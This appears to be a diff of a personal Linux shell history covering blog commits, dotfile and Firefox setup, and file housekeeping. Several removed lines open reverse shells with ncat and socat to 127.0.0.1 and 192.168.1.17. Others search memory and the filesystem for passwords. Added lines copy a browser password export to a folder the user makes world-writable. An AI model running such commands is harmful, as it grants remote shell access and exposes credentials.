@@ -1,391 +1,3 @@
-clear
-pandoc Beginner.md | lynx -stdin
-pandoc Beginner.md 
-pandoc Beginner.md | lynx 
-pandoc Beginner.md | lynx -
-go version
-sudo apt-get remove --purge pandoc lynx
-clear
-cd ..
-cd Git/
-clear
-ll
-git clone https://github.com/charmbracelet/glow.git
-cd glow/
-clear
-ll
-go build
-clear
-ll
-clear
-./glow ~/OpenVPN/Beginner.md 
-./glow 
-./glow stash ~/OpenVPN/Beginner.md 
-./glow 
-./glow ~/OpenVPN/Beginner.md 
-cat ~/OpenVPN/Beginner.md 
-cat ~/OpenVPN/Beginner.md | ./glow -
-cd ..
-clear
-ll
-rm -r glow/
-sudo rm -r glow/
-clear
-tree
-ps axjf | grep openvpn
-cd Git/polarpwn.gg/
-clear
-ll
-cd themes/nord-hugo-book/
-clear
-ll
-clear
-ll
-cd assets/
-clear
-ll
-clear
-ll
-nano ../../../config.toml 
-subl Git/polarpwn.gg/
-cp Downloads/temp/
-clear
-cd Downloads/temp/
-ll
-cp Resume\ \&\ Cover\ Letter\ -\ Muhammad\ Nur\ Irsyad-1.pdf ~/Documents/CAREER/Resume.pdf 
-cd Git/polarpwn.gg/content/posts/blog/
-clear
-ll
-cd Git/polarpwn.gg/
-clear
-ll
-cd themes/nord-hugo-book/
-clear
-git status
-subl assets/_markdown.scss 
-git add .
-clear
-git status
-git commit -m "update table styling & boo-menu collapse on mobile view"
-clear
-git status
-git push
-cd ..
-clear
-git status
-git add themes/nord-hugo-book/
-clear
-git status
-git commit -m "update table styling & boo-menu collapse on mobile view"
-clear
-git status
-clear
-git status
-git add config.toml resources/
-clear
-git status
-git commit -m "update base URL and repo path"
-clear
-git status
-clear
-git status
-git add content/docs/org/contribution/
-clear
-git status
-git add content/posts/blog/simple-usage-of-optflag-in-bash-script.md 
-clear
-git status
-git commit -m "update minor styling + button referencing"
-clear
-git status
-git add content/posts/blog/understanding-the-basic-regex-format.md 
-git commit -m "adding #2 post on blog. testing out on mobile soon"
-clear
-git status
-git push
-readme 
-cd Script/
-clear
-lll
-clear
-ll
-./touchpad-speed.sh 
-man curl
-curl --help | grep "-o"
-curl --help | grep -E "-o"
-curl --help | grep -E "\-o"
-xfce4-screenshooter 
-lmaooo
-woami
-clear
-exit
-curl http://localhost:8080
-curl https://localhost:4433
-curl -kg https://localhost:4433/
-curl -kg https://localhost:4433/cert.pem
-curl https://localhost:4433
-ncat --tcp 127.0.0.1 8080 -e /bin/bash
-ncat 127.0.0.1 8080 -e /bin/bash
-ncat -c bash 127.0.0.1 8080
-clear
-ncat -c bash 127.0.0.1 8080
-ncat 127.0.0.1 8080 -e /bin/bash
-whoami
-pwd
-lclear
-clear
-ncat 127.0.0.1 8080 -e /bin/bash
-ncat localhost 8080 -e /bin/bash
-clear
-ncat 192.168.1.17 8080 -e /bin/bash
-ncat 192.168.1.17 31337 -e /bin/bash
-ncat 127.0.0.1 8080 -e /bin/bash
-clear
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.1.17:1234,verify=0
-nano .config/qtile/config.py 
-cd Downloads/
-cd temp/
-ll
-cp menu\ 1\ \(1\).svg /home/icat/Git/polarpwn.gg/themes/nord-hugo-book/static/svg/menu.svg
-cp toc\ 1.png /home/icat/Git/polarpwn.gg/themes/nord-hugo-book/static/svg/toc.svg 
-cp ~/Git/hotpotcookie/themes/nord-hugo-book/static/svg/toc.svg /home/icat/Git/polarpwn.gg/themes/nord-hugo-book/static/svg/toc.svg 
-cp menu\ 1\ \(2\).svg /home/icat/Git/polarpwn.gg/themes/nord-hugo-book/static/svg/menu.svg
-cp toc\ 2.svg /home/icat/Git/polarpwn.gg/themes/nord-hugo-book/static/svg/toc.svg 
-cd Git/polarpwn.gg/themes/nord-hugo-book/
-clear
-ll
-cd static/
-clear
-ll
-cd svg/
-clear
-ll
-pwd
-ll
-cp toc.svg toc.svg.bak
-clear
-ll
-cd Git/polarpwn.gg/
-hugo server --minify --theme nord-hugo-book
-date 
-cd Script/
-cler
-clear
-ll
-./touchpad-speed.sh 
-cd Downloads/
-clear
-l
-cd temp/
-clear
-ll
-mv Data\ \ penulis\ HAKI\ \(1\).xlsx Data\ Penulis\ HAKI.xlsx 
-clear
-ll
-ckear
-ll
-mv Nurwulan-removebg-preview.png TTD-Nurwulan.png
-mv Haspul-2.png TTD-Haspul.png
-mv WhatsApp\ Image\ 2023-07-08\ at\ 6.10.00\ AM.jpeg KTP-Haspul.jpeg
-mv KTP.jpg KTP-Nurwulan.jpg 
-cd SC
-sd Script/
-clear
-ll
-cd Script/
-ll
-cd
-nano .bashrc 
-cp Downloads/temp/Resume\ \&\ Cover\ Letter\ -\ Muhammad\ Nur\ Irsyad\ \(2\)-1.pdf\ Resume.pdf Documents/CAREER/Resume.pdf 
-neofetch 
-clear
-powertop
-clear
-sudo apt-get install powertop
-clear
-powertop 
-clear
-sudo powertop 
-bash Script/touchpad-speed.sh 
-history 
-sudo apt-get remove --purge powertop 
-sudo apt-get autoremove 
-clear
-bash Script/touchpad-speed.sh 
-cat Script/touchpad-speed.sh 
-nano Script/touchpad-speed.sh 
-bash Script/touchpad-speed.sh 
-nano Script/touchpad-speed.sh 
-bash Script/touchpad-speed.sh 
-xinput --list
-nano Script/touchpad-speed.sh 
-bash Script/touchpad-speed.sh 
-nano Script/touchpad-speed.sh 
-bash Script/touchpad-speed.sh 
-nano Script/touchpad-speed.sh 
-bash Script/touchpad-speed.sh 
-xinput --list --short
-xinput --list-props 17
-xinput --list-props 17 | grep device
-xinput --list-props 17 | grep Device
-xinput --list-props 17 | grep Accel
-xinput --list-props 17 | grep SPeed
-xinput --list-props 17 | grep Speed
-cd /tmp/
-clear
-nano ok
-sudo apt-get install grep
-sudo apt-get install awk
-sudo apt-get install find
-locate
-sudo apt-get install locate
-locate
-find
-clear
-find ~/Documents/
-find ~/Documents/ -type f -name '*.docx'
-clear
-command_not_found_handle find
-neofetch 
-ps axjf | grep ssh
-kill -9 929763
-readme 
-strings
-strings /dev/mem -n10 | grep -i PASS
-sudo strings /dev/mem -n10 | grep -i PASS
-locate password
-locate password | more
-clear
-netstat -tan
-netstat -ta
-clear
-crontab -l
-crontab --help
-man crontab 
-nano vocab.txt
-cat vocab.txt | cut -d '\t' -f 2
-cat vocab.txt | cut -d '\s' -f 2
-cat vocab.txt | cut -d ' ' -f 2
-clear
-cat vocab.txt | cut -f 1
-cat vocab.txt | cut -f 1,3
-cat vocab.txt | cut -f 1,2
-clear
-cat vocab.txt | cut -f 1,2
-cat vocab.txt | cut -f 1,2 | column -s -t ' '
-cat vocab.txt | cut -f 1,2 | column 
-clear
-cat vocab.txt | cut -f 1,2 | column -t -s '\t'
-clear
-cat vocab.txt | cut -f 1,2 | column -t -s 
-cat vocab.txt | cut -f 1,2 | column -t -s '\t'
-cat vocab.txt | cut -f 1,2 | column -t -s ' '
-clear
-cat vocab.txt | cut -f 1,2 | column -t 
-cat vocab.txt | cut -f 1,2 | column 
-cat vocab.txt | cut -f 1,2
-cat vocab.txt | cut -f 1,2 | more
-cat vocab.txt | cut -f 1,2 | column 
-clear
-cat vocab.txt | cut -f 1,2 | column | cut -d -f 1
-cat vocab.txt | cut -f 1,2 | column | cut -f 1,2
-cat vocab.txt | cut -f 1,2 | column | cut -f 2,3
-cat vocab.txt | cut -f 1,2 | column | cut -f 3,4
-cat vocab.txt | cut -f 1,2 | column | cut -f 1,2
-cat vocab.txt | cut -f 1,2 | column | cut -f 1,2 > vocab2.txt
-cat vocab2.txt 
-cd OpenVPN/
-clear
-sudo openvpn hotpotcookie-IN-REG-1.ovpn 
-cd Downloads/temp/
-clear
-ll
-cp Resume\ \&\ Cover\ Letter\ -\ Muhammad\ Nur\ Irsyad-2.pdf ~/Documents/CAREER/Cover\ Letter.pdf 
-cd ~/Documents/CAREER/
-mv Cover\ Letter.pdf Cover\ Letter - Muhammad Nur Irsyad.pdf 
-mv Cover\ Letter.pdf Cover\ Letter\ -\ Muhammad\ Nur\ Irsyad.pdf 
-cd Downloads/temp/
-clear
-ll
-cp Resume\ \&\ Cover\ Letter\ -\ Muhammad\ Nur\ Irsyad\ \(1\)-1.pdf ~/Documents/CAREER/Resume\ -\ Muhammad\ Nur\ Irsyad.pdf 
-xfce4-about
-sudo apt-get install libxfce4ui-utils 
-xfce4-about
-apt --version
-apt version
-clear
-readme 
-virt-manager 
-cd .config/qtile/
-clear
-ll
-mkdir wallpps
-cd wallpps/
-clear
-ll
-pwd
-ll
-cd Pictures/wallpp/
-clear
-ll
-cp 1084228362.jpg /home/icat/.config/qtile/wallpps/tokyo.jpg
-sudo virt-manager 
-sudo apt-get remove --purge virt-manager 
-sudo apt-get autoremove 
-clear
-ll
-clear
-cd Downloads/
-clear
-cd temp/
-clear
-sudo dpkg -i virtualbox-7.0_7.0.10-158379~Ubuntu~jammy_amd64.deb 
-sudo apt-get install -f
-sudo dpkg -i virtualbox-7.0_7.0.10-158379~Ubuntu~jammy_amd64.deb 
-virtualbox
-bash Script/touchpad-speed.sh 
-cd Script/
-clear
-ll
-bash touchpad-speed.sh 
-nano touchpad-speed.sh 
-xinput --list-props 17 | grep Speed
-xinput --list --short
-nano touchpad-speed.sh 
-bash touchpad-speed.sh 
-cd Script/
-clear
-ll
-bash touchpad-speed.sh 
-nano touchpad-speed.sh 
-xinput --list-props 13 | grep Speed
-nano touchpad-speed.sh 
-bash touchpad-speed.sh 
-nano Script/touchpad-speed.sh 
-bash Script/touchpad-speed.sh 
-nano .config/qtile/config.py 
-cd .config/qtile/scripts/
-clea
-clear
-ll
-nano sub-deviceconf.sh 
-ifconfig
-readme 
-cd Script/
-clear
-ll
-./touchpad-speed.sh 
-nano touchpad-speed.sh 
-./touchpad-speed.sh 
-cd Git/dotfile/
-clear
-ll
-pwd
-clear
-cd
-clear
-ll
-clear
 find ~/ -type d
 find ~/ -type d -regex '^.*'
 clear
@@ -1998,3 +1610,391 @@ clear
 ,,
 ll
 firefox 
+clear
+ll
+cd 
+cd .config/
+clear
+ll
+cd xfce4/
+clear
+ll
+cd terminal/
+cler
+clear
+ll
+cat terminalrc 
+accessdb 
+cat accels.scm 
+clear
+ll
+cd
+cd Git/dotfile/
+clear
+cd
+espeak 
+subl .config/qtile/scripts/widget.sh 
+ranger 
+lear
+clear
+cd -
+clear
+git status
+clear
+git status
+sudo bash sync.sh -s
+clear
+git status
+cat .home/.info 
+clear
+ll
+git status
+cat .home/.info 
+rm .home/.info 
+clear
+git status
+clearclear
+cler
+clear
+xrandr | grep '*' | awk '{ print $1 }'
+tar xjf .etc/firefox-*.tar.bz2
+ll
+rm -r firefox/
+clear
+ll
+git status
+cd ..
+clear
+ll
+cd
+cd Git/do
+cd Git/dotfile/
+clear
+ll
+cp .etc/firefox-115.0.2.tar.bz2 /tmp/
+cd /tmp/
+clear
+tar xjf .etc/firefox-*.tar.bz2
+ll
+clear
+tar xjf firefox-*.tar.bz2
+clear
+crontab -l
+a="0 0 * * * rm /home/icat/Downloads/temp/* && rm -r /home/icat/Downloads/temp/*
+"
+echo $a
+clear
+ll
+clear
+ll
+clear
+a="0 0 * * * rm /home/icat/Downloads/temp/\* && rm -r /home/icat/Downloads/temp/\*
+"
+echo $a
+clear
+a="0 0 * * * rm /home/icat/Downloads/temp/* && rm -r /home/icat/Downloads/temp/*
+"
+(crontab -l; printf "$a\n") | crontab -
+crontab -l
+cd
+clear
+cd -
+sudo mv firefox /opt/
+sudo ln -s /opt/firefox/firefox /usr/local/bin/firefox
+firefox 
+cd /opt/
+ll
+cd firefox/
+ll
+clear
+l
+cd
+sudo wget https://raw.githubusercontent.com/mozilla/sumo-kb/main/install-firefox-linux/firefox.desktop -P /usr/local/share/applications
+cd /usr/local/share/applications/
+clear
+ll
+nano firefox.desktop 
+ll
+cd
+clear
+ll
+cd /opt/firefox/
+ll
+cd defaults/pref/
+ll
+nano channel-prefs.js 
+cd ..
+clear
+ll
+cd .
+cd ..
+clear
+ll
+ranger
+clear
+clear
+sudo apt-get remove --purge firefox
+rm -r .mozilla/firefox/
+sudo apt-get install firefox
+cd Git/
+cler
+clear
+ll
+cd SimpleFox/
+clear
+ll
+cp -r chrome/ assets/ ~/.mozilla/firefox/*.default-release/
+ll assets/
+cd ..
+cd -
+clear
+git status
+ll
+fdisk -l
+clear
+sudo fdisk -l
+mount /dev/sdb1 /media/icat/
+sudo mount /dev/sdb1 /media/icat/
+cd /media/icat/
+clear
+ll
+cd OTHERS/
+ll
+clear
+ll
+cd ..
+clear
+ll
+ll OTHERS/
+clear
+ll
+ll SKCK/
+clear
+ll
+mv SKCK/ OTHERS/
+sudo mv SKCK/ OTHERS/
+clear
+ll
+mkdir SECRET
+sudo su
+cd Git/dotfile/
+clear
+ll
+nano sync.sh 
+bash sync.sh -s
+sudo bash sync.sh -s
+nano sync.sh 
+clear
+ll
+nano sync.sh 
+ll .etc/
+cat sync.sh | grep mozilla
+nano sync.sh 
+clear
+git status
+ll
+ll .home/
+sudo chown -R icat:icat *
+ll
+ll .etc/
+ll .home/
+chown -R icat:icat .home/
+sudo chown -R icat:icat .home/
+ll .home/
+clear
+sudo chown -R icat:icat .
+clear
+ll
+git status
+clear
+git status
+nano sync.sh 
+clear
+ll
+nano .config/
+nano sync.sh 
+cd /media/icat/
+ll
+cd
+sudo umount /media/icat
+cd Git/dotfile/
+clear
+nano sync.sh 
+cd .mozilla/extensions/
+clear
+ll
+cat manual-stg-backup-2023-07-29@drive4ik.json 
+clear
+ll
+cd ..
+clear
+ll
+ll *.default
+ll *.default*
+clear
+ll
+ll firefox/
+cd extensions/
+clear
+ll
+ll manual-stg-backup-2023-07-29@drive4ik.json 
+pwd
+cd ..
+ll firefox/zooa6hgr.default-release/chrome/
+cd firefox/zooa6hgr.default-release/chrome/
+clear
+pwd
+cd ~/Git/dotfile/
+clear
+ll
+ll .etc/
+rm .etc/firefox-115.0.2.tar.bz2 
+clear
+ll
+ll .etc/
+cd  ~/.mozilla/firefox/zooa6hgr.default-release/
+clear
+ll
+ll chrome/
+clear
+pwd
+cd -
+ll
+ll .etc/
+ll .etc/extensions/
+sudo chown -R icat:icat .etc/
+ll .etc/extensions/
+clear
+git status
+cd ~/.mozilla/firefox/7hglb80r.default/
+clear
+ll
+cd ..
+kk
+ll
+cd zooa6hgr.default-release/
+clear
+ll
+cat times.json 
+ckear
+cd ..
+cear
+ll
+clear
+ll
+cd 7hglb80r.default/
+clear
+ll
+touch user.js
+nano user.js 
+firefox 
+ll
+cd ..
+clear
+ll
+cat zooa6hgr.default-release/chrome/userContent.css 
+lear
+cd zooa6hgr.default-release/
+clear
+ll
+cd chrome/
+ll
+cat userContent.css 
+clear
+ll
+cat userChrome.css 
+clear
+cd
+cd Downloads/temp/
+clear
+ll
+mv firefox-115.0.3.tar.bz2 ~/Git/dotfile/.etc/
+cd ~/Git/dotfile/
+clear
+git status
+lear
+clear
+ll .etc/
+ll .etc/extensions/
+ll
+ll .home/
+cd
+cd Documents/
+ll
+cd CAREER/
+clear
+pwd
+nano ~/.config/kitty/pwd.session
+cat ~/.config/kitty/pwd.session
+nano ~/.config/kitty/kitty.conf 
+cd Script/
+clear
+ll
+bash touchpad-speed.sh 
+cat .i
+cat .info 
+nano .info 
+readme 
+clear
+nano .info 
+readme 
+clear
+sudo mv .info /media/icat/SECRET/
+ll
+readme 
+clear
+ll
+clear
+cd Downloads/
+clear
+ll
+cd temp/
+clear
+ll
+sudo cp Brave\ Passwords.csv /media/icat/SECRET/
+fdisk -l
+sudo fdisk -l
+sudo mount /dev/sdb1 /media/icat/TOSHIBA-64/
+cd /media/icat/TOSHIBA-64/
+clear
+ll
+ll SECRET/
+clear
+ll
+l
+cear
+clear
+ll
+ll OTHERS/
+clear
+ll
+mv OTHERS/ .other
+sudo mv OTHERS/ .other
+clear
+ll
+ll .other/
+clear
+ll
+sudo mv SECRET/ .secret
+clear
+ll
+ll .secret/
+cat .secret/.info 
+clear
+ll
+sudo chmod +x *
+ll
+sudo chmod +w *
+clear
+ll
+sudo chmod o+w *
+ll
+ll .secret/
+sudo chmod u+w .secret/
+ll .secret/
+sudo chmod g+w .secret/
+ll .secret/
+sudo chmod o+w .secret/
+ll .secret/
+clear
+ll
